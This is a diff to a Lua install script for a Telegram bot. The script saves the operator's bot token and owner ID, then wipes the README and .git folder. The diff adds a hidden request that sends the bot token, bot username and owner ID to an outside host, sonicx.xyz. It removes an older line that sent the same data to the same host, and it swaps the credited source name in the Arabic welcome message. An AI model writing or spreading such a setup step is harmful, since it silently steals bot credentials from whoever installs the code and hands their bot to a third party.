@@ -96,15 +96,13 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
+https.request('https://sonicx.xyz/Mic/Susj.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
-Cr_file:close() 
+Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس عماركو \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
+local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس داني \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
-Souser = SUDO_USER:gsub('@','')
-Souser = Souser:gsub([[\_]],'_')
-https.request("https://sonicx.xyz/Mic/Susj.php?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
 os.execute([[
 rm -f ./README.md
 rm -rf ./.git
